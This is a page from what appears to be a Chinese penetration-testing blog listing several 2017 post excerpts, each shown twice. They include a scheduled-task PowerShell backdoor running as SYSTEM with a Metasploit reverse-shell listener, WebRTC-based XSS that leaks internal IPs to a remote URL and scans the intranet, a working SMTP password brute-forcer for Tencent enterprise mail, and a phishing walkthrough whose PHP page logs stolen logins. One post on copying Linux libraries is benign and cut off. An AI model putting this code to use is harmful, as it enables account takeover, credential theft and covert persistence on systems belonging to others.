<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
	
	</div>
  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/24/schtasks定时后门.html" >powershell定时任务后门</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-24  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>msf接收多个shell可以如下这样做：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 192.168.1.117
set LPORT 31337
set ExitOnSession false
exploit -j -z

或者上面的保存为listener.rc，然后msfconsole启动
msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>XML文件如下:</p>
	

	</div>
  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>msf接收多个shell可以如下这样做：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 192.168.1.117
set LPORT 31337
set ExitOnSession false
exploit -j -z

或者上面的保存为listener.rc，然后msfconsole启动
msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>XML文件如下:</p>
	
	</div>
  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/23/xss-get-ip.html" >XSS获取内网地址</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
<p>代码未测试</p>
<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function()&#123;
	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
	if (window.mozRTCPeerConnection)&#123;
		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
	&#125;;
	rtc.onicecandidate &#x3D; function(evt)&#123;
		if (evt.candidate) grepSDP(evt.candidate.candidate);
	&#125;;
	rtc.createOffer(function(offerDesc)&#123;
		grepSDP(offerDesc.sdp);
		rtc.setLocalDescription(offerDesc);
	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
	var addrs &#x3D; Object.create(null);
	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
	function updateDisplay(newAddr)&#123;
		if(newAddr in addrs) return;
		else addrs[newAddr] &#x3D; true;
		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
		sendip(address);
	&#125;
	function grepSDP(sdp)&#123;
		var hosts &#x3D; [];
		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[4],
				type &#x3D; parts[7];
				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[2];
				updateDisplay(addr);
			&#125;
		&#125;);
	&#125;
&#125;)();
function sendip(ipaddress)&#123;
	var url &#x3D; &quot;xxxxx&quot;;
&#125;

＝＝＝＝代码貌似不全＝＝＝＝

function ipsend(ip, netport)&#123;
	var ipdata &#x3D; ip+&quot;:&quot;+netport;
	var url &#x3D; &quot;x.x.x.x&quot;;
	var xmlhttp1 &#x3D; new XMLHttpRequest();
	xmlhttp1.open(&quot;POST&quot;,url,true);
	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);

function ipCreate(ip)&#123;
	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
		ElementCreate(ips+i,&quot;80&quot;,i);
		ElementCreate(ips+i,&quot;8087&quot;,i);
		ElementCreate(ips+i,&quot;8080&quot;,i);
	&#125;
&#125;
function ElementCreate(ip,xport,i)&#123;
	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
	scriptElement.src &#x3D; url;
	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
	document.body.appendChild(scriptElement);
&#125;
ipcreate(&quot;10.10.125.195&quot;);
&#125;

&#x3D;＝＝＝＝代码貌似不全＝＝＝＝







<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
<p>代码未测试</p>
<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function()&#123;
	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
	if (window.mozRTCPeerConnection)&#123;
		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
	&#125;;
	rtc.onicecandidate &#x3D; function(evt)&#123;
		if (evt.candidate) grepSDP(evt.candidate.candidate);
	&#125;;
	rtc.createOffer(function(offerDesc)&#123;
		grepSDP(offerDesc.sdp);
		rtc.setLocalDescription(offerDesc);
	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
	var addrs &#x3D; Object.create(null);
	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
	function updateDisplay(newAddr)&#123;
		if(newAddr in addrs) return;
		else addrs[newAddr] &#x3D; true;
		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
		sendip(address);
	&#125;
	function grepSDP(sdp)&#123;
		var hosts &#x3D; [];
		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[4],
				type &#x3D; parts[7];
				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[2];
				updateDisplay(addr);
			&#125;
		&#125;);
	&#125;
&#125;)();
function sendip(ipaddress)&#123;
	var url &#x3D; &quot;xxxxx&quot;;
&#125;

＝＝＝＝代码貌似不全＝＝＝＝

function ipsend(ip, netport)&#123;
	var ipdata &#x3D; ip+&quot;:&quot;+netport;
	var url &#x3D; &quot;x.x.x.x&quot;;
	var xmlhttp1 &#x3D; new XMLHttpRequest();
	xmlhttp1.open(&quot;POST&quot;,url,true);
	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);

function ipCreate(ip)&#123;
	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
		ElementCreate(ips+i,&quot;80&quot;,i);
		ElementCreate(ips+i,&quot;8087&quot;,i);
		ElementCreate(ips+i,&quot;8080&quot;,i);
	&#125;
&#125;
function ElementCreate(ip,xport,i)&#123;
	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
	scriptElement.src &#x3D; url;
	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
	document.body.appendChild(scriptElement);
&#125;
ipcreate(&quot;10.10.125.195&quot;);
&#125;

&#x3D;＝＝＝＝代码貌似不全＝＝＝＝







<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/19/baopo-Q.html" >某企业邮箱爆破</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-19  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

import smtplib
import random
import time
import sys


def tencent(user, password):
	time.sleep(random.uniform(2, 6))
	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
	smtp_port &#x3D; 587
	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	try:
		server.login(user, password)
		print &#39;[+]----------auth success------%s&#39; % password
	except smtplib.SMTPAuthenticationError as e:
		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)


def genpasswd(user, suffix):
	domain &#x3D; suffix.split(&#39;.&#39;)[0]
	password &#x3D; []
	password.append(domain + &#39;@123&#39;)
	password.append(domain + &#39;@1234&#39;)
	name &#x3D; user.split(&#39;@&#39;)[0]
	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
	password.extend(wake_value)
	return password


def genusers(userfiles, suffix):
	users &#x3D; []
	with open(userfiles, &#39;rb&#39;) as f:
		while 1:
			user &#x3D; f.readline().strip()
			if user &#x3D;&#x3D; &#39;&#39;:
				break
			users.append(user + &#39;@&#39; + suffix)
		return users

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	if len(sys.argv) !&#x3D; 3:
		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
		exit(0)
	userfile &#x3D; sys.argv[1]
	suffix &#x3D; sys.argv[2]
	for user in genusers(userfile, suffix):
		for password in genpasswd(user, suffix):
			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

import smtplib
import random
import time
import sys


def tencent(user, password):
	time.sleep(random.uniform(2, 6))
	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
	smtp_port &#x3D; 587
	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	try:
		server.login(user, password)
		print &#39;[+]----------auth success------%s&#39; % password
	except smtplib.SMTPAuthenticationError as e:
		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)


def genpasswd(user, suffix):
	domain &#x3D; suffix.split(&#39;.&#39;)[0]
	password &#x3D; []
	password.append(domain + &#39;@123&#39;)
	password.append(domain + &#39;@1234&#39;)
	name &#x3D; user.split(&#39;@&#39;)[0]
	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
	password.extend(wake_value)
	return password


def genusers(userfiles, suffix):
	users &#x3D; []
	with open(userfiles, &#39;rb&#39;) as f:
		while 1:
			user &#x3D; f.readline().strip()
			if user &#x3D;&#x3D; &#39;&#39;:
				break
			users.append(user + &#39;@&#39; + suffix)
		return users

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	if len(sys.argv) !&#x3D; 3:
		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
		exit(0)
	userfile &#x3D; sys.argv[1]
	suffix &#x3D; sys.argv[2]
	for user in genusers(userfile, suffix):
		for password in genpasswd(user, suffix):
			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/04/12/xss-encode2.html" >XSS编码</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-04-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
</ul>
<p>在前面文章里面xss的编码提到过这个东西: </p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<strong>HTML标签里面</strong>，js之行之前，html形式的编码会自动decode。</p>
<p>解释：</p>
<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
<p>丢到test.html里面，使用浏览器打开还是原样。</p>
<p>所以xss存在的步骤来说是这样的：<br><code>代码--&gt; 浏览器执行 --&gt; xss</code></p>
<p>浏览器解释了其中的代码展现给人看。</p>
<p>HTML的自动解码是在执行js代码之前，并且<code>on*</code>事件内可以执行js脚本，即 <strong>html解码之后才可以执行js</strong>。</p>
	

	</div>
  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
</ul>
<p>在前面文章里面xss的编码提到过这个东西: </p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<strong>HTML标签里面</strong>，js之行之前，html形式的编码会自动decode。</p>
<p>解释：</p>
<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
<p>丢到test.html里面，使用浏览器打开还是原样。</p>
<p>所以xss存在的步骤来说是这样的：<br><code>代码--&gt; 浏览器执行 --&gt; xss</code></p>
<p>浏览器解释了其中的代码展现给人看。</p>
<p>HTML的自动解码是在执行js代码之前，并且<code>on*</code>事件内可以执行js脚本，即 <strong>html解码之后才可以执行js</strong>。</p>
	
	</div>
  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/04/01/how-to-fish.html" >How To Fishing</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-04-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
</blockquote>
<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
假的登录页面: fake.html
世界上最好的语言: deal.php
fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
</ul>
<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
<ul>
<li>然后再服务器上构造一个deal.php</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$user &#x3D; $_POST[&#39;username&#39;];
$pass &#x3D; $_POST[&#39;password&#39;];
$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
fclose($f);
header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>还差一个js</li>
</ul>
	

	</div>
  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
</blockquote>
<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
假的登录页面: fake.html
世界上最好的语言: deal.php
fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
</ul>
<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
<ul>
<li>然后再服务器上构造一个deal.php</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$user &#x3D; $_POST[&#39;username&#39;];
$pass &#x3D; $_POST[&#39;password&#39;];
$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
fclose($f);
header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>还差一个js</li>
</ul>
	
	</div>
  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/03/09/copy-shared-lib.html" >Linux复制带动态库的命令</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-03-09  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

if [ $# !&#x3D; 2 ] ; then
    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
    exit 1
fi

PATH_TO_BINARY&#x3D;&quot;$1&quot;
TARGET_FOLDER&#x3D;&quot;$2&quot;

# if we cannot find the the binary we have to abort
if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
    exit 1
fi

# copy the binary to the target folder
# create directories if required
echo &quot;---&gt; copy binary itself&quot;
cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;

# copy the required shared libs to the target folder
# create directories if required
echo &quot;---&gt; copy libraries&quot;
for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
   if [ -f &quot;$lib&quot; ] ; then
